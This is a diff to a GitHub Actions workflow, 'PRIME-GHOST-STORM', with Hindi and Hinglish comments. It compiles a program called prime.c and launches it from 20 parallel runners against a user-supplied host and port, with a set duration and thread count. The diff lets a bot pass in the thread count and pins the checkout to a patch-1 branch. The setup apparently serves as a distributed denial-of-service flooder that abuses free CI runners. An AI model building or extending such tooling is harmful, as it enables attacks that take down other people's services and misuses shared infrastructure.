@@ -13,26 +13,29 @@ on:
         description: 'DURATION (SEC)'
         required: true
         default: '180'
+      threads:  # ✨ Naya Input: Bot se threads lene ke liye
+        description: 'THREADS'
+        required: true
+        default: '800'
 
 jobs:
   PRIME-GHOST-STORM:
     runs-on: ubuntu-latest
     strategy:
       fail-fast: false
-      # ✨ बदलाव 1: max-parallel को 20 पर सेट करें। 
-      # फ्री अकाउंट एक बार में सिर्फ 20 नोड्स चलाता है, 30 लिखने से बाकी 10 अटक जाते हैं।
       max-parallel: 20 
       matrix:
         node: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20] 
     steps:
       - name: 🛰️ INITIALIZING
         uses: actions/checkout@v4
+        with:
+          ref: patch-1  # ✨ Forcefully patch-1 branch se code uthayega
 
       - name: 🔥 FIRING GHOST v6.0
         run: |
-          # ✨ बदलाव 2: Optimization को -O3 पर ही रखें और v6.0 बाइनरी चलाएं
           gcc -O3 prime.c -o PRIME -lpthread
           chmod +x PRIME
-          # 800 थ्रेड्स अब आराम से चलेंगे क्योंकि हमने Non-blocking मोड डाल दिया है
-          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} 800
+          # ✨ Ab ye bot dwara bheje gaye threads use karega
+          ./PRIME ${{ github.event.inputs.host }} ${{ github.event.inputs.port }} ${{ github.event.inputs.time }} ${{ github.event.inputs.threads }}
           
